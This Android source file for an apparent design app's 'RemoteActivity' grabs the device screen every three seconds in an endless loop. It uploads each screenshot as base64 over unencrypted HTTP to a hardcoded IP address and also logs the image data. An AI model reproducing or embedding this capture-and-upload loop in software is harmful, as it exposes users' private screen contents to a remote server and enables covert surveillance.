package design.example.com.designpro;

import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.hardware.display.DisplayManager;
import android.media.Image;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Bundle;
import android.support.annotation.Nullable;
import android.support.v7.app.AppCompatActivity;
import android.util.Base64;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.Display;
import android.widget.Toast;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.ByteArrayInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.nio.ByteBuffer;

import design.example.com.designpro.util.CommonUtil;
import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class RemoteActivity extends AppCompatActivity {
    private static final int REQUEST_MEDIA_PROJECTION = 10086;

    MediaProjectionManager mMediaProjectionManager;

    MediaProjection mMediaProjection;

    ImageReader mImageReader;

    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_remote);
        //1、首先获取MediaProjectionManager
        mMediaProjectionManager = (MediaProjectionManager) getApplicationContext().getSystemService(Context.MEDIA_PROJECTION_SERVICE);
        startActivityForResult(mMediaProjectionManager.createScreenCaptureIntent(), REQUEST_MEDIA_PROJECTION);

        new Thread() {
            @Override
            public void run() {
                while (true) {
                    String fileName = startCapture();
                    File f = new File(CommonUtil.getExternalPath() + "/DesignPro/" + fileName);
                    if (f.exists()) {
                        uploadShot(f, "http://203.195.224.187/DesignPro/uploadShot");
                    }
                    try {
                        Thread.sleep(3000);
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                }
            }
        }.start();
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == REQUEST_MEDIA_PROJECTION) {
            if (resultCode == RESULT_OK) {
                Toast.makeText(getApplication(), "开启录制视频成功" +
                        "向服务器发送", Toast.LENGTH_SHORT).show();

                mMediaProjection = mMediaProjectionManager.getMediaProjection(resultCode, data);

                DisplayMetrics metrics = new DisplayMetrics();
                Display display = getWindowManager().getDefaultDisplay();
                if (Build.VERSION.SDK_INT < 17) {
                    display.getMetrics(metrics);
                } else {
                    display.getRealMetrics(metrics);
                }

                int screenWidth = metrics.widthPixels;
                int screenHeight = metrics.heightPixels;
                int densityDpi = metrics.densityDpi;

                mImageReader = ImageReader.newInstance(screenWidth, screenHeight, PixelFormat.RGBA_8888, 1);

                mMediaProjection.createVirtualDisplay("shot_image", screenWidth,
                        screenHeight,
                        densityDpi, DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR, mImageReader
                                .getSurface(), null, null);
            } else {
                Toast.makeText(getApplication(), "开启录制视频失败", Toast.LENGTH_SHORT).show();
            }
        }
    }

    private String startCapture() {
        String fileName = System.currentTimeMillis() + ".png";
        if (mImageReader == null) {
            return fileName;
        }
        Image image = mImageReader.acquireLatestImage();
        if (image == null) {
            return fileName;
        }
        int width = image.getWidth();
        int height = image.getHeight();
        final Image.Plane[] planes = image.getPlanes();
        final ByteBuffer buffer = planes[0].getBuffer();
        int pixelStride = planes[0].getPixelStride();
        int rowStride = planes[0].getRowStride();
        int rowPadding = rowStride - pixelStride * width;
        Bitmap bitmap = Bitmap.createBitmap(width + rowPadding / pixelStride, height, Bitmap.Config.ARGB_8888);
        bitmap.copyPixelsFromBuffer(buffer);
        bitmap = Bitmap.createBitmap(bitmap, 0, 0, width, height);
        if (bitmap != null) {
            //发送
            saveBitmap(fileName, bitmap);
        }
        image.close();
        return fileName;
    }

    /**
     * 保存方法
     */
    public void saveBitmap(String picName, Bitmap bm) {
        File folder = new File(CommonUtil.getExternalPath() + "/DesignPro");
        if (!folder.exists()) {
            folder.mkdir();
        }
        File f = new File(folder, picName);
        if (f.exists()) {
            f.delete();
        }
        try {
            FileOutputStream out = new FileOutputStream(f);
            bm.compress(Bitmap.CompressFormat.PNG, 90, out);
            out.flush();
            out.close();
        } catch (FileNotFoundException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        } catch (IOException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }
    }

    public void uploadShot(File file, String url) {
        OkHttpClient okHttpClient = new OkHttpClient();
        //2.创建Request对象，设置一个url地址（百度地址）,设置请求方式。
        MediaType JSON = MediaType.parse("application/json; charset=utf-8");
        JSONObject jsonObject = new JSONObject();
        String data = fileToBase64(file);
        try {
            jsonObject.put("img", data);
            Log.i("img", data);
        } catch (JSONException e) {
            e.printStackTrace();
        }
        RequestBody requestBody = RequestBody.create(JSON, jsonObject.toString());
        Log.i("img", jsonObject.toString());
        final Request request = new Request.Builder().url(url)
                .method("POST", requestBody).build();
        okHttpClient.newCall(request).enqueue(new Callback() {
            @Override
            public void onFailure(Call call, IOException e) {

            }

            @Override
            public void onResponse(Call call, Response response) throws IOException {

            }
        });
    }

    /**
     * 文件转base64字符串
     *
     * @param file
     * @return
     */
    public static String fileToBase64(File file) {
        String base64 = null;
        InputStream in = null;
        try {
            in = new FileInputStream(file);
            byte[] bytes = new byte[in.available()];
            int length = in.read(bytes);
            base64 = Base64.encodeToString(bytes, 0, length, Base64.DEFAULT);
        } catch (FileNotFoundException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        } catch (IOException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        } finally {
            try {
                if (in != null) {
                    in.close();
                }
            } catch (IOException e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
            }
        }
        return base64;
    }
}
